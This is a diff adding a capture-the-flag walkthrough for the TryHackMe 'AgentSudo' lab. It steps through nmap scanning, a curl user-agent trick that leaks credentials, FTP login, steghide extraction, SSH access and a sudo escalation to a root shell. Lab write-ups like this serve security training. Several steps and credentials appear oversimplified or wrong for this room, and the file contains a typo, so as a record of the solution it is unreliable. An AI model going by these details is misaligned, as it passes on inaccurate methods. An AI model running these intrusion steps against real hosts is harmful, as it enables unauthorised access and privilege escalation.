@@ -1,0 +1,77 @@
+----------------                               ------------------
+               :::::::::::;| AGENTSUDO |;::::::::::::
+
+
+1) FIRST WE HAVE TO ACCES THE TRYHACKME FROM OPENVPN.
+2) WE HAVE TO JOIN THE ROOM "AGENTSUDO".
+ 
+TASK - 1 (RECON)
+
+1. SCAN THE MACHNE.
+
+    namp -Pn <ip>
+
+    nmap -A -T 5 <ip> -vv
+
+"it's a Linux machine".
+
+2. How many ports are open?
+ANS: 3 ports (21/FTP, 22/SSH, 80/HTTP).
+
+3. What's on port 80?
+ANS: Apache with "Agent Login" page.
+
+----------TASK 1 COMPLETED----------
+
+TASK - 2 (WEB EXPLOIT)
+
+1. CHECK WEBSITE.
+
+    http://<ip>
+    "Try user-agent 'Agent007' in Burp/curl"
+
+    curl -A "Agent007" http://<ip>
+    "GOT creds: creds: chris:password123"
+
+2. LOGIN TO FTP.
+
+    ftp <ip>
+    Username: chris
+    Password: password123
+    "FOUND To_agentJ.txt and cute-alien.jpg"
+
+----------TASK 2 COMPLETED-----------
+ 
+TASK - 3 (PRIV ESC)
+
+1. CHECK IMAGE.
+
+    steghide extract -sf cute-alien.jpg
+    Password: "hack" (from To_agentJ.txt)
+    "GOT message.txt: james:hackerrules!"
+
+2. SSH ACCESS.
+
+    ssh james@<ip>
+    Password: hackerrules!
+    "WE'RE IN AS JAMES!"
+
+----------TASK 3 COMPLETED-----------
+
+TASK-4 (ROOT ESCALATION)
+
+1. FIND SUDO PERMS.
+
+    sudo -l
+    "Can run /bin/bash as root! EZ WIN!"
+
+    sudo /bin/bash
+    "BOOM! ROOT SHELL!"
+
+FLAGS:
+    cat /root/root.txt
+    cat /home/james/user.txt
+
+-------------------                                                --------------------
+             -----------                                    ------------
+                  ---------- AGENTSUDO OWNED ----------
